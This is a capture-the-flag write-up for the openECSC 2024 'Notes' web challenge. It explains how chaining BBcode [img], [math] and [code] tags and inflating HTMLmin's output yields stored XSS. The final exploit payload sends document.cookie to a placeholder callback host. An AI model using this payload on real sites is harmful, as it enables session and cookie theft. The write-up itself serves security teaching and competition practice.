# openECSC 2024 - Round 3

## [web] Notes (5 solves)

Great news! BabyNotes is not a baby anymore!

Read the changelog [here](https://notes.challs.open.ecsc2024.it/view.php?id=changelog)

Authors: Riccardo Bonafede <@bonaff>, Stefano Alberto <@Xato>

## Overview

The application is the successor of [BabyNotes](https://github.com/ECSC2024/openECSC-2024/tree/main/round-2/web03).

All the previous vulnerabilities are (kinda) fixed, and it was added a BBcode parser during the rendering of a note.

## Solution

The intended solution is to break the BBcode parser in order to obtain an XSS using a combination of the `[img]`, `[math]`, and `[code]` tags.

- The `[img]` tag takes an URL, and create a `<img>` html tag. It uses a (bugged)check that deletes every BBcodes tag inside the URL.
- The `[math]` tag strips every HTML tag
- The `[code]` tag substitutes its content with a placeholder, in the form of `>>>$id<<<`, that will substitute back with its original content at the end of the parsing.

The main idea is to abuse a combination of code and math to delete a double quote (`"`) at the end of the `src` attribute of an`img` tag, in order to inject an `onError` attribute.

Using the placeholder created from the `[code]` tag, it is possible to create html tags that can be deleted by the math attribute. take the following payload as an example:

```html
[img]http://foo.com/[math[math]][code]a[/code][/img][/math][img]http://a/onerror=alert(1)//;[/img]
```

At first, the [code] tag is replaced with its placeholder:

```html
[img]http://foo.com/[math[math]]>>>1<<<[/img][/math][img]http://a/onerror=alert(1)//;[/img]
```

Then the [img] is parsed, and transformed to its HTML counterpart (notice how the [math[math]] is transformed to [math]):

```html
<img src="http://foo.com/[math]>>>1<<<">[/math]<img src="http://a/onerror=alert(1)//;">
```

Finally, math will strip every HTML tag, in this case only the <"> tag:

```html
<img src="http://foo.com/[math]>>>1<<[/math]<img src="http://a/onerror=alert(1)//;">
```

The final part is to "bypass" the HTML minifier ([HTMLmin](https://github.com/voku/HtmlMin)) applied to every response. This minifier will delete the onError attribute from the img tag.

HTMLmin works by parsing the HTML code, "fixing" it if there are some unclosed tags, and then deleting every part that is not necessary. The interesting part is at the end of the minify function:

```php
    // ------------------------------------
    // check if compression worked
    // ------------------------------------

    if ($origHtmlLength < \strlen($html)) {
      $html = $origHtml;
    }

    return $html;
```

So, if the minified HTML is bigger than the original, the library will keep the original.
Making a minified HTML bigger than the original is quite simple: because the minify process will try to close every unclosed tag, it is possible to abuse the math tag to delete a closing HTML tag. A payload that does this is the following one:

```bbcode
[i][math][/i][/math]
```

that will be translated to a span tag without the </span> closing tags. Spamming a bunch of these will lead to a bigger minified HTML.

## Exploit

Payload:

```bbcode
[img]http://foo.com/[math[math]][code]a[/code][/img][/math][img]http://a/onerror=location.href=`//{CALLBACK_HOST}/`+document.cookie//;[/img]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
```
